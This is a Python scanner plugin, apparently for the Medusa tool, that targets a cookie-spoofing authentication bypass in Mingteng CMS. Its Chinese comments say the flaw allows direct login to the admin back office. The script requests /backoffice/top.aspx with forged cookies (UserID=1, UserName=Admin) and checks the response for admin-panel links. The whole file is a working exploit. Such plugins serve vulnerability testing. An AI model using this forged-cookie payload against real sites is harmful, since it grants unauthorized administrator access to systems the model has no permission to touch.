#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 明腾cms cookie欺骗漏洞
referer: unknown
author: Lucifer
description: 存在cookie欺骗漏洞,直接登录后台。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/backoffice/top.aspx"
cookies= { "UserID":"1", "UserName":"Admin", "path":"/" }
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers,cookies=cookies, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers,cookies=cookies, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if (con.lower().find('admin')!=-1 and con.lower().find('sysset/default.aspx')!=-1) or (con.lower().find('admin')!=-1 and con.lower().find('passwords.aspx')!=-1):
            Medusa = "{} 存在明腾cms cookie欺骗漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass